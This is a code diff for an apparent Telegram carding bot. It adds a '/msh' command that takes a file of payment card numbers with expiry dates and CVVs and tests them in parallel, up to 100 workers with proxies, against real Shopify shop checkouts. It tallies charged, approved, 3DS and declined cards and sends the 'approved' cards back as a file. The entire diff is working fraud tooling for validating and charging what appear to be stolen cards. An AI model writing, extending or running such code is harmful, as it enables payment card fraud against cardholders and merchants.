@@ -6850,6 +6850,252 @@ async def _make_the_machine_ready():
         print(f"the machine could not be made ready: {e}", flush=True)
 
 
+
+# --- /msh — Mass Shopify Native Check ---
+ACTIVE_MSH_PROCESSES = {}
+
+@client.on(events.NewMessage(pattern=r"(?i)^[/]msh\b"))
+async def msh(event):
+    """Mass Shopify check — reply to a .txt file with /msh"""
+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned":
+        return await event.reply(banned_user_message())
+    if not can_access:
+        msg, buttons = access_denied_message_with_button()
+        return await event.reply(msg, buttons)
+    user_id = event.sender_id
+    if not event.reply_to_msg_id:
+        return await event.reply(
+            "Reply to a file of cards with `/msh`\n"
+            "One card a line: `cc|mm|yy|cvv`")
+    replied = await event.get_reply_message()
+    if not replied or not replied.document:
+        return await event.reply("Reply to a file of cards with `/msh`.")
+    file_path = await replied.download_media()
+    try:
+        async with aiofiles.open(file_path, "r") as f:
+            lines = (await f.read()).splitlines()
+    except Exception as e:
+        return await event.reply("Error reading file: %s" % e)
+    finally:
+        try: os.remove(file_path)
+        except: pass
+    cards = [l.strip() for l in lines
+             if re.match(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", l.strip())]
+    if not cards:
+        return await event.reply("No valid cards in that file.")
+    limit = get_file_mass_limit()
+    if user_id in ADMIN_ID:
+        limit = max(limit, 10000)
+    cards = cards[:limit]
+    if user_id not in ADMIN_ID:
+        increment_hitter_usage(user_id)
+    ACTIVE_MSH_PROCESSES[user_id] = True
+    asyncio.create_task(process_msh_cards(event, cards))
+
+
+async def process_msh_cards(event, cards):
+    """Mass Shopify check with scalable parallel workers."""
+    user_id = event.sender_id
+    total = len(cards)
+    await register_mass_user(user_id)
+
+    # Load user sites for rotation
+    user_extra_sites = []
+    try:
+        _sd = await load_json(SITE_FILE)
+        user_extra_sites = _sd.get(str(user_id), [])
+    except: pass
+
+    from gates.shopify_native_gate import check_card_native, DEFAULT_SITE_ROTATION
+
+    # Scalable workers: more cards = more workers
+    if total <= 50:
+        workers = 5
+    elif total <= 100:
+        workers = 10
+    elif total <= 500:
+        workers = 25
+    elif total <= 1000:
+        workers = 50
+    else:
+        workers = 100
+
+    # Admin can override
+    if user_id in ADMIN_ID:
+        workers = max(workers, int(os.environ.get("MSH_WORKERS", str(workers))))
+
+    print(f"[MSH] Starting: {total} cards, {workers} workers", flush=True)
+
+    # Progress tracking
+    checked = [0]
+    approved = [0]
+    declined = [0]
+    errors = [0]
+    charged = [0]
+    tds = [0]
+    insf = [0]
+    good_cards = []
+    all_results = []
+    start_time = time.time()
+    stop_key = f"msh_stop_{user_id}".encode()
+    stop_buttons = [[Button.inline("\U0001f6d1 Stop", stop_key)]]
+
+    # Progress message
+    sep = "\u2550" * 19
+    def make_progress():
+        chk = checked[0]
+        pct = f"{(chk/total*100):.1f}" if total > 0 else "0.0"
+        elapsed = int(time.time() - start_time)
+        if elapsed < 60: t = f"{elapsed}s"
+        else: t = f"{elapsed//60}m {elapsed%60}s"
+        bar_len = 15
+        filled = int(bar_len * chk / total) if total > 0 else 0
+        bar = "\u2588" * filled + "\u2591" * (bar_len - filled)
+        return (
+            f"\u25f3 **Mass Shopify Check**\n{sep}\n\n"
+            f"\u2705 Checked: **{chk}/{total}**\n"
+            f"\U0001f525 Charged: **{charged[0]}**\n"
+            f"\u2705 Approved: **{approved[0]}**\n"
+            f"\U0001f512 3DS: **{tds[0]}**\n"
+            f"\U0001f4b3 Insufficient: **{insf[0]}**\n"
+            f"\u274c Declined: **{declined[0]}**\n"
+            f"\u26a0 Errors: **{errors[0]}**\n\n"
+            f"Workers: **{workers}** | \u23f1 {t}\n"
+            f"{bar} **{pct}%**"
+        )
+
+    progress_msg = await event.reply(make_progress(), buttons=stop_buttons)
+
+    # Update progress every 3 seconds
+    last_update = [0]
+    async def update_progress():
+        now = time.time()
+        if now - last_update[0] < 3:
+            return
+        last_update[0] = now
+        try:
+            await progress_msg.edit(make_progress(), buttons=stop_buttons)
+        except: pass
+
+    # Card queue
+    queue = asyncio.Queue()
+    for card in cards:
+        parts = card.split("|")
+        if len(parts) == 4:
+            await queue.put(parts)
+
+    lock = asyncio.Lock()
+
+    async def worker():
+        while True:
+            if user_id not in ACTIVE_MSH_PROCESSES:
+                break
+            try:
+                cc, mm, yy, cvv = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                break
+            if len(yy) == 4: yy = yy[2:]
+            mm = mm.zfill(2)
+            try:
+                result = await asyncio.wait_for(
+                    check_card_native(cc, mm, yy, cvv,
+                                      site_url=None,
+                                      proxy_str=get_user_proxy(user_id) or None,
+                                      extra_sites=user_extra_sites),
+                    timeout=60)
+            except asyncio.TimeoutError:
+                result = {"Response": "TIMEOUT", "Charged": "False", "Price": "N/A"}
+            except Exception as e:
+                result = {"Response": "ERROR", "Message": str(e)[:80], "Charged": "False", "Price": "N/A"}
+
+            resp = str(result.get("Response") or "UNKNOWN")
+            charged_card = str(result.get("Charged")).lower() == "true"
+            price = result.get("Price") or "N/A"
+            msg = str(result.get("Message") or resp)[:120]
+
+            async with lock:
+                checked[0] += 1
+                full = f"{cc}|{mm}|{yy}|{cvv}"
+                if charged_card and resp == "ORDER_PLACED":
+                    charged[0] += 1
+                    approved[0] += 1
+                    good_cards.append(f"{full} | CHARGED | {msg} | ${price}")
+                elif resp in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "OTP_REQUIRED"):
+                    approved[0] += 1
+                    if resp == "INSUFFICIENT_FUNDS": insf[0] += 1
+                    if resp == "OTP_REQUIRED": tds[0] += 1
+                    good_cards.append(f"{full} | {resp} | {msg} | ${price}")
+                elif resp in ("UNTESTED", "ERROR", "TIMEOUT", "CART_FAILED", "CAPTCHA_REQUIRED"):
+                    errors[0] += 1
+                else:
+                    declined[0] += 1
+                all_results.append(f"{full} | {resp} | {msg}")
+                await update_progress()
+
+            queue.task_done()
+
+    # Launch workers
+    worker_tasks = [asyncio.create_task(worker()) for _ in range(workers)]
+    await queue.join()
+    for t in worker_tasks:
+        t.cancel()
+
+    # Final update
+    elapsed = int(time.time() - start_time)
+    if elapsed < 60: t = f"{elapsed}s"
+    else: t = f"{elapsed//60}m {elapsed%60}s"
+
+    final = (
+        f"\u25f3 **Mass Shopify — DONE**\n{sep}\n\n"
+        f"\u2705 Checked: **{checked[0]}/{total}**\n"
+        f"\U0001f525 Charged: **{charged[0]}**\n"
+        f"\u2705 Approved: **{approved[0]}**\n"
+        f"\U0001f512 3DS: **{tds[0]}**\n"
+        f"\U0001f4b3 Insufficient: **{insf[0]}**\n"
+        f"\u274c Declined: **{declined[0]}**\n"
+        f"\u26a0 Errors: **{errors[0]}**\n\n"
+        f"\u23f1 {t} | Workers: {workers}"
+    )
+    try:
+        await progress_msg.edit(final)
+    except: pass
+
+    # Save results to file
+    if good_cards:
+        import tempfile
+        fname = f"msh_results_{user_id}.txt"
+        fpath = os.path.join(tempfile.gettempdir(), fname)
+        with open(fpath, "w") as f:
+            f.write("\n".join(good_cards))
+        try:
+            await event.reply("Approved cards:", file=fpath)
+        except: pass
+
+    # Log
+    try:
+        await log_gate_result("SHOP", "", "MASS",
+                              f"checked={checked[0]} approved={approved[0]} declined={declined[0]} errors={errors[0]}",
+                              elapsed, user_id, "", "mass-file")
+    except: pass
+
+    ACTIVE_MSH_PROCESSES.pop(user_id, None)
+    print(f"[MSH] Done: {total} cards in {t} — approved={approved[0]} declined={declined[0]} errors={errors[0]}", flush=True)
+
+
+@client.on(events.CallbackQuery(pattern=rb"^msh_stop_"))
+async def msh_stop_cb(event):
+    user_id = int(event.data.decode().replace("msh_stop_", ""))
+    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
+        return await event.answer("Only the owner can stop this.", alert=True)
+    if user_id in ACTIVE_MSH_PROCESSES:
+        del ACTIVE_MSH_PROCESSES[user_id]
+        await event.answer("Stopping mass Shopify check...", alert=True)
+    else:
+        await event.answer("No active mass Shopify check.", alert=True)
+
+
+
 @client.on(events.NewMessage(pattern=r"(?i)^[/]sh\b"))
 async def sh_native(event):
     """One card, into the checkout of a real shop."""
